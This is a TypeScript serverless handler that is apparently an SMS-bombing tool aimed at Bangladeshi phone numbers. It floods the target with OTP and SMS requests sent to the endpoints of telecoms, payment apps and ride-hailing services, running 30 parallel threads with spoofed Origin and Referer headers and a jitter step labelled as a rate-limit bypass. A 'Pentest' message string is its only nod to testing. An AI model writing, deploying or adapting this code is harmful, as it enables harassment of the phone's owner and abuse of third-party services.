import { VercelRequest, VercelResponse } from '@vercel/node';

const API_LIST = [
  {"url": "https://1smsbd.com/api/send-sms", "target_param": "phone"},
  {"url": "https://sslcommerz.com.bd/sms/send", "target_param": "mobile"},
  {"url": "https://api.robi.com.bd/sms/otp", "target_param": "phone"},
  {"url": "https://selfcare.gp.com.bd/api/otp-request", "target_param": "number"},
  {"url": "https://bl.com.bd/api/sms", "target_param": "phone"},
  {"url": "https://pathao.com.bd/api/otp", "target_param": "phone"},
  {"url": "https://bKash.com/api/otp-send", "target_param": "number"},
  {"url": "https://nagad.com.bd/api/verify-otp", "target_param": "phone"},
  {"url": "https://teletalk.com.bd/api/otp", "target_param": "phone"}
];

async function sendRealSMS(api, phone, customMsg) {
  try {
    const payload = {
      [api.target_param]: phone,
      message: customMsg,
      otp: "123456",
      text: customMsg
    };
    
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://selfcare.gp.com.bd',
      'Referer': 'https://selfcare.gp.com.bd/'
    };
    
    const response = await fetch(api.url, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload)
    });
    
    const data = await response.text();
    const success = response.ok || data.toLowerCase().includes('success') || 
                   data.toLowerCase().includes('sent') || 
                   data.includes('200');
    
    return { success, status: response.status, data: data.slice(0, 100) };
  } catch {
    return { success: false };
  }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST method allowed' });
  }

  const { phone, threads = 30, duration = 45, message = "🚨 Pentest SMS: 123456" } = req.body;
  
  if (!phone || !phone.match(/^01[3-9]\d{8}$/)) {
    return res.status(400).json({ error: 'Valid BD number: 01XXXXXXXXX' });
  }

  res.json({ 
    status: '🚀 SMS BOMBING STARTED', 
    target: phone, 
    threads, 
    duration,
    message 
  });

  // Background SMS flood
  let successCount = 0, total = 0;
  const promises = [];
  
  for (let t = 0; t < threads; t++) {
    promises.push(
      new Promise(async (resolve) => {
        for (let i = 0; i < duration * 3; i++) {
          const api = API_LIST[Math.floor(Math.random() * API_LIST.length)];
          const result = await sendRealSMS(api, phone, message);
          
          total++;
          if (result.success) successCount++;
          
          console.log(`📱 [${t+1}] ${api.url.slice(-25)} → ${result.success ? '✅' : '❌'}`);
          
          // Rate-limit bypass: random jitter
          await new Promise(r => setTimeout(r, 30 + Math.random() * 70));
        }
        resolve();
      })
    );
  }

  await Promise.all(promises);
  
  console.log(`\n✅ FINAL: ${successCount}/${total} (${Math.round(successCount/total*100)}%) SMS delivered`);
}
